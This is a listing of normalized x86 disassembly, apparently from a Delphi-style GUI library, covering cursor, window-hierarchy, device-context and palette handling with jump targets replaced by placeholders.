lea eax [ ebp - 0x10 ]
push eax
call GetCursorPos
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x48 ] edx
jmp r-xdata
mov esi [ ebp - 0x8 ]
mov edx [ esi + 0x48 ]
mov eax [ ebp - 0x8 ]
mov edi [ eax + 0x38 ]
add edx [ edi + 0x4c ]
mov eax [ esi + 0x44 ]
add eax [ edi + 0x48 ]
lea ecx [ ebp - 0x18 ]
call sub_416114
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x4c ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x50 ] edx
sub_43e1c4
push ebp
mov ebp esp
push ebx
push esi
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
setne bl
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov bl 0x1
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
mov ecx [ rw-data ]
mov si 0xffbe
call sub_4034e4
mov ebx eax
sub_43e238
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] al
xor ebx ebx
mov [ ebp - 0x2 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_43e504
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ rw-data ] eax
xor edx edx
push ebp
push sub_43e492
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x1
mov eax [ rw-data ]
mov dl [ ebp - 0x1 ]
mov [ eax + 0x1c ] dl
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_43d104
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_403498
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
cmp [ ebx + 0x4 ] 0x0
sete al
mov [ ebx + 0x6c ] al
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x10 ]
mov [ ebp - 0x6 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax + 0x14 ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x18 ]
mov [ ebp - 0x6 ] edx
jmp r-xdata
mov [ ebp - 0x2 ] al
cmp [ rw-data ] 0x2
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
push ebp
call sub_43e1c4
pop ecx
test al al
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebp - 0x2 ] 0x0
je r-xdata
mov al 0x1
call sub_43daf0
test al al
je r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call SetCursor
mov eax [ rw-data ]
call sub_4480a8
jmp r-xdata
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e499
mov eax [ rw-data ]
call sub_4032e8
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_456c04
test eax eax
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x0
mov eax [ ebp - 0x6 ]
push eax
mov al [ ebp - 0x2 ]
push eax
mov eax [ rw-data ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xa ]
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx ]
mov al 0x3
cmp [ ebp - 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
xor ecx ecx
mov edx 0xb03a
mov eax [ rw-data ]
call sub_440e64
jmp r-xdata
mov edx [ eax + 0x220 ]
cmp edx [ ebx + 0x38 ]
jne r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ rw-data ]
add edx 0xc
push edx
mov edx [ rw-data ]
mov edx [ edx + 0x8 ]
mov ecx [ rw-data ]
xchg edx eax
call sub_43d9bc
mov al 0x4
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0xc ] ecx
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0x10 ] ecx
xor edx edx
mov [ ebp - 0xa ] edx
xor edx edx
mov [ ebp - 0x6 ] edx
xor edx edx
call sub_45a870
sub_43e499
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
retn
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_403474
test al al
jne r-xdata
mov eax [ rw-data ]
call sub_4032e8
mov eax [ rw-data ]
mov edx [ rw-data ]
call sub_403474
test al al
jne r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
sub_43e528
push ebx
push esi
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_43cb90
mov esi eax
test esi esi
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_43e55c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor esi esi
mov eax edi
call sub_43e528
mov ebp eax
test ebp ebp
je r-xdata
mov eax esi
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi ebp
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax ebp
call sub_43f7f4
lea edx [ esp + 0x4 ]
mov ecx ebx
mov eax ebp
call sub_443d84
test eax eax
je r-xdata
mov esi eax
sub_43e5a4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx esi
call sub_417414
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ ebx ] eax
sub_43e5cc
push ebx
mov ebx eax
mov eax [ ebx ]
call sub_4176b4
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx ]
call sub_4032e8
xor eax eax
mov [ ebx ] eax
sub_43e5ec
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
sub eax edi
push eax
mov eax [ esp + 0x8 ]
sub eax esi
push eax
push ebx
call SetWindowOrgEx
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_43e61c
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ rw-data ]
call sub_4178dc
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43e6cc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_417940
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0xc ]
jne r-xdata
xor eax eax
push ebp
push sub_43e6a5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
call sub_43e858
call sub_403b20
call sub_403b20
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_417570
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
call sub_421308
test al al
je r-xdata
mov esp ebp
pop ebp
retn
sub_43e6d8
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_4178dc
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43e776
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e77d
mov eax [ rw-data ]
call sub_417940
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_43e74e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_43e858
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_421364
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_417570
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_421308
test al al
je r-xdata
sub_43e784
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax esi
call sub_43e858
mov edx ebx
and dl 0xfc
mov eax esi
call sub_420e4c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_43e7b0
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4214e8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_4214ec
mov eax [ ebp - 0x4 ]
call sub_43e8a4
mov eax [ rw-data ]
call sub_4178dc
mov ebx eax
xor eax eax
push ebp
push sub_43e835
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x8 ] 0x4
jl r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x60 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_417414
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_417940
retn
call sub_43e61c
sub_43e858
push ebx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
je r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_4214ec
mov edx ebx
mov eax [ rw-data ]
call sub_4178f0
mov eax [ ebx + 0x5c ]
push eax
mov eax [ ebx + 0x60 ]
push eax
call ReleaseDC
xor eax eax
mov [ ebx + 0x5c ] eax
sub_43e8a4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x58 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4402f4
test al al
je r-xdata
and [ ebx + 0x54 ] 0xffffff7f
or [ ebx + 0x54 ] 0x80
jmp r-xdata
sub_43e8d0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4032b8
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_43e90c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_417bf8
pop esi
pop ebx
retn
mov eax ebx
mov edx [ esi + 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ esi + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x14 ]
mov [ eax + 0x14 ] edx
mov edx [ esi + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_43e954
push esi
mov esi eax
sub edx 0x1
jb r-xdata
cmp ecx [ esi + 0x8 ]
je r-xdata
je r-xdata
pop esi
retn
mov [ esi + 0x8 ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0xc ]
je r-xdata
dec edx
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x10 ]
jae r-xdata
mov [ esi + 0xc ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0x10 ]
je r-xdata
dec edx
je r-xdata
mov [ esi + 0x10 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x14 ]
jae r-xdata
mov [ esi + 0x10 ] ecx
mov eax [ esi + 0x8 ]
test eax eax
jbe r-xdata
cmp ecx [ esi + 0x14 ]
je r-xdata
jmp r-xdata
mov [ esi + 0x14 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp eax ecx
jae r-xdata
mov [ esi + 0x14 ] ecx
mov eax [ esi + 0xc ]
test eax eax
jbe r-xdata
mov [ esi + 0x8 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
cmp eax ecx
jae r-xdata
mov [ esi + 0xc ] ecx
sub_43ea10
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1c ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43eadd
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43eae4
lea eax [ ebp - 0x1c ]
call sub_404038
lea eax [ ebp - 0x8 ]
call sub_404038
retn
mov edx edi
mov eax [ ebx + 0x10 ]
mov si 0xffee
call sub_4034e4
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x7c ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x10 ]
mov ax [ eax + 0x84 ]
call sub_44f174
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_408f18
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_40408c
sub_43eb00
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_43eb67
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_44c240
test al al
je r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x18 ]
call sub_43fcb0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403498
mov edx [ eax + 0x64 ]
pop eax
call sub_404444
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43eb6e
lea eax [ ebp - 0x4 ]
call sub_404038
retn
mov al 0x1
sub_43eb74
push ebx
mov ebx eax
mov eax ebx
call sub_44c268
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403498
pop edx
cmp dl [ eax + 0x6a ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_43eba8
push ebx
mov ebx eax
mov eax ebx
call sub_44c2b8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403498
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x80 ]
call sub_404444
je r-xdata
mov al 0x1
pop ebx
retn
sub_43ebe0
push ebx
mov ebx eax
mov eax ebx
call sub_44c2f4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403498
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x57 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_43ec14
push ebx
mov ebx eax
mov eax ebx
call sub_41d988
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x120 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_43ec3c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_43fce0
sub_43ec5c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
sub_43ec7c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x80
mov edx esi
call sub_40408c
sub_43eca0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_43fbd0
sub_43ecc0
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x120 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x124 ] edx
sub_43ecec
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403498
mov edi eax
mov eax [ edi + 0x74 ]
mov esi [ ebx + 0x18 ]
cmp eax [ esi + 0x158 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403498
mov edx [ edi + 0x78 ]
mov eax [ esi + 0x154 ]
call sub_404444
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403498
mov al [ edi + 0x70 ]
cmp al [ esi + 0x150 ]
je r-xdata
mov al 0x1
sub_43ed50
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_43f62c
sub_43ed70
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_43f618
sub_43ed90
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0x150 ] bl
sub_43edb0
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41d098
mov [ ebx + 0x3c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebx + 0x38 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_420298
mov esi eax
mov [ ebx + 0x68 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_43fd60
mov al [ r-xdata ]
mov [ ebx + 0x61 ] al
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_43e8d0
mov esi eax
mov [ ebx + 0x74 ] esi
mov [ esi + 0x1c ] ebx
mov [ esi + 0x18 ] sub_440c24
mov [ ebx + 0x70 ] 0xff000005
mov [ ebx + 0x57 ] 0x1
mov [ ebx + 0x58 ] 0x1
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x9a ] 0x1
mov [ ebx + 0x60 ] 0x1
mov [ ebx + 0x5e ] 0x0
mov [ ebx + 0x7a ] 0xfff4
mov eax [ r-xdata ]
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x150 ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_43ee88
push ebx
push esi
push edi
add esp 0xfffffff0
call sub_403674
mov ebx edx
mov edi eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_45e788
mov eax [ edi + 0xa0 ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40365c
push edi
xor ecx ecx
mov edx 0xb039
call sub_440e64
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov edx esp
mov eax edi
call sub_43f650
mov ecx esp
or edx 0xffffffff
mov eax edi
mov si 0xffcc
call sub_4034e4
xor eax eax
mov [ edi + 0xa0 ] eax
jmp r-xdata
mov eax [ edi + 0x6c ]
call sub_4032e8
xor eax eax
mov [ edi + 0x6c ] eax
mov eax [ edi + 0x74 ]
call sub_4032e8
mov eax [ edi + 0x68 ]
call sub_4032e8
mov eax [ edi + 0x64 ]
call sub_408a88
mov edx ebx
and dl 0xfc
mov eax edi
call sub_41d0e4
test bl bl
jle r-xdata
sub_43ef54
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
sub_43ef7c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] dl
mov ebp eax
xor ebx ebx
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
mov si 0xffd7
call sub_4034e4
mov edi eax
test edi edi
je r-xdata
lea edx [ esp + 0x4 ]
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
mov al [ esp ]
xor al 0x1
neg al
sbb eax eax
push eax
push edi
push esi
call SelectPalette
mov edi eax
push esi
call RealizePalette
test eax eax
je r-xdata
push 0xffffffff
push edi
push esi
call SelectPalette
push esi
mov eax [ esp + 0x8 ]
push eax
call ReleaseDC
mov bl 0x1
mov eax ebp
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43f004
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x61 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x61 ] al
mov eax ebx
call sub_43f304
sub_43f024
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
or [ ebx + 0x50 ] 0x8000
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
mov eax [ ebx + 0x6c ]
call sub_4032e8
xor eax eax
mov [ ebx + 0x6c ] eax
and [ ebx + 0x50 ] 0xffff7fff
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x6c ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_441c80
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_4034e4
mov edx ebx
mov eax edi
call sub_41d168
mov eax ebx
mov si 0xffd9
call sub_4034e4
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x6c ] eax
pop edi
pop esi
pop ebx
retn
sub_43f0ec
push ebx
push esi
push edi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x8
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41d4f8
and [ ebx + 0x54 ] 0xfff7
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_440e64
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_440e64
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_440e64
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax ebx
call sub_440e64
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_440e64
sub_43f180
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_41d3b4
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x7c ]
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp edi eax
jne r-xdata
xor edx edx
mov eax esi
call sub_43fc68
jmp r-xdata
xor edx edx
mov eax esi
call sub_43f024
sub_43f1c4
push ebx
push esi
push edi
push ecx
mov ebx edx
mov edi eax
mov al [ edi + 0x5b ]
cmp bl al
je r-xdata
mov eax edi
mov si 0xffd0
call sub_4034e4
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] al
mov [ edi + 0x5b ] bl
xor eax eax
mov al bl
mov dl [ eax + rw-data ]
mov eax edi
call sub_43f004
test [ edi + 0x1c ] 0x1
jne r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
cmp bl 0x6
je r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
cmp [ esp ] 0x6
je r-xdata
mov al [ esp ]
dec eax
sub al 0x2
setb al
mov edx ebx
add dl 0xfd
sub dl 0x2
setb dl
cmp al dl
jne r-xdata
mov eax edi
mov si 0xffee
call sub_4034e4
mov al [ esp ]
test al al
je r-xdata
sub al 0x5
je r-xdata
test bl bl
je r-xdata
sub bl 0x5
je r-xdata
mov eax [ edi + 0x4c ]
push eax
mov eax [ edi + 0x48 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx [ edi + 0x40 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
sub_43f26c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea ecx [ ebp + 0x8 ]
lea edx [ ebp + 0xc ]
mov eax ebx
call sub_4413f4
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp esi [ ebx + 0x40 ]
jne r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_4400f8
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_43f304
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
push 0x0
xor ecx ecx
mov edx 0x47
mov eax ebx
call sub_440e64
mov eax ebx
mov si 0xffd0
call sub_4034e4
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov eax ebx
mov si 0xffcf
call sub_4034e4
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
sub_43f304
push ebx
